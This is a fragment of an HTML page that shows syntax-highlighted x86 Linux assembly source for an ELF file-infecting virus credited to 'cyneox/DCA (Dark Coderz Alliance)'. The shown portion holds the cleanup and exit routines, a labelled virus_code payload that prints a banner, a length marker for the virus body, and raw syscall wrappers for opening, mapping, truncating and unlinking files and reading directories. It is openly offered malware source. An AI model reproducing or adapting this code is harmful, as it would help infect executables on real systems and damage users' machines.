        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.write</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                                   
        
</span><span class="sc5">unmap</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ptr to our</span><span class="sc0">
                                                        </span><span class="sc1">; mapped file</span><span class="sc0">
                                  
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_EHDR</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; file size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.munmap</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">back</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">SZ_STACK</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sys.close</span><span class="sc0">          </span><span class="sc1">; closing bad fd</span><span class="sc0">
</span><span class="sc5">bye</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">SZ_STACK</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">                </span><span class="sc1">; SYS_EXIT </span><span class="sc0">
        
</span><span class="sc5">pushy</span><span class="sc4">:</span><span class="sc0"> 
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">
          
</span><span class="sc5">virus_code</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">pushf</span><span class="sc0"> 
           </span><span class="sc6">pusha</span><span class="sc0">
     
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x20200a3a</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x3a3a206b</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x742e786f</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x656e7963</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x2e777777</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc2">0x203A3A3A</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           </span><span class="sc6">popa</span><span class="sc0">
           </span><span class="sc6">popf</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
          
</span><span class="sc5">vircode_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virus_code</span><span class="sc0">          
          
          

</span><span class="sc5">sys.open</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_OPEN</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sys.read</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_READ</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sys.write</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_WRITE</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sys.ftruncate</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_FTRUNCATE</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sys.lseek</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_LSEEK</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sys.mmap</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_MMAP</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">sys.munmap</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_MUNMAP</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sys.fstat</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_FSTAT</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sys.unlink</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_UNLINK</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sys.readdir</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_READDIR</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">sys.close</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_CLOSE</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">point</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> 
</span><span class="sc5">copyright</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"cyneox/DCA (Dark Coderz Alliance)"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span></div></body>
</html>
